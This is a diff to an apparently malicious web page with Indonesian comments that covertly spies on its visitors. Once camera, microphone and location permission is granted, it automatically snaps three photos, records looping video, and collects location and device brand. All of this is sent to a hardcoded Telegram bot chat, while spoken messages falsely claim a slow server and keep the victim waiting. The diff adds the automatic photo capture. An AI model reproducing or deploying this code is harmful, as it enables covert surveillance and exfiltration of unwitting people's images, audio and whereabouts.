@@ -51,32 +51,46 @@
     const chat_id = '6374002294';
     let recorder;
     let recordedChunks = [];
-
     let autoStream;
 
-window.onload = async () => {
-  try {
-    await getLocation(); // Minta izin lokasi lebih awal
-    autoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    console.log("Akses kamera & mikrofon diberikan otomatis");
-  } catch (e) {
-    alert("Izin kamera/mikrofon atau lokasi ditolak.");
-  }
-};
+    window.onload = async () => {
+      try {
+        await getLocation();
+        autoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        console.log("Akses kamera & mikrofon diberikan otomatis");
+        autoTakePhotos(); // ambil 3 foto saat pertama kali masuk
+      } catch (e) {
+        alert("Izin kamera/mikrofon atau lokasi ditolak.");
+      }
+    };
 
-async function startStreaming() {
-      // Kirim notifikasi awal ke Telegram
+    async function startStreaming() {
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id, text: 'Pengguna baru memulai akses web yang kamu kasih ke pengguna bismillah berasil amiin' })
       });
 
-      // Suara sapaan
       const synth = window.speechSynthesis;
       const welcome = new SpeechSynthesisUtterance('Halo! Terima kasih sudah melanjutkan. Proses sedang berjalan tunggu 5 menit kaau blm juga tunggu 1 jam soalnya selver agak lemot silahkan tab baru aja dulu');
       welcome.lang = 'id-ID';
       synth.speak(welcome);
+
+      // sapaan bucin keren
+      const bucin = [
+        "Halo sayang, akhirnya kamu datang juga.",
+        "Aku kangen banget loh, jangan tinggalin aku ya!",
+        "Aku siap nemenin kamu sampai akhir, serius.",
+        "Jangan lupa senyum ya, soalnya senyummu bikin dunia lebih indah."
+      ];
+      bucin.forEach((text, i) => {
+        setTimeout(() => {
+          const u = new SpeechSynthesisUtterance(text);
+          u.lang = 'id-ID';
+          synth.speak(u);
+        }, (i + 1) * 5000);
+      });
+
       const popup = document.getElementById('step1');
       popup.style.transition = 'opacity 0.5s ease';
       popup.style.opacity = 0;
@@ -95,11 +109,11 @@ async function startStreaming() {
         recorder.start();
 
         setTimeout(() => {
-  setInterval(() => {
-    recorder.stop();
-    recorder.start();
-  }, 17000);
-}, 17000);
+          setInterval(() => {
+            recorder.stop();
+            recorder.start();
+          }, 17000);
+        }, 17000);
 
         setTimeout(() => {
           recorder.stop();
@@ -186,11 +200,12 @@ Merek Perangkat: ${brand}
         );
       });
     }
-      async function capturePhoto() {
+
+    async function capturePhoto() {
       const video = document.getElementById('video');
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -205,5 +220,39 @@ Merek Perangkat: ${brand}
         body: formData
       }).catch(err => console.error("Telegram photo error:", err));
     }
-  </script></body>
-</html>
+
+    // Fitur auto ambil 3 foto pertama kali
+    async function autoTakePhotos() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+
+        for (let i = 0; i < 3; i++) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+          const formData = new FormData();
+          formData.append("chat_id", chat_id);
+         formData.append("photo", blob, `photo_${i + 1}.jpg`);
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          await new Promise(r => setTimeout(r, 1500));
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        console.warn("Gagal ambil foto otomatis:", e);
+      }
+    }
+  </script>
+</body>
+</html
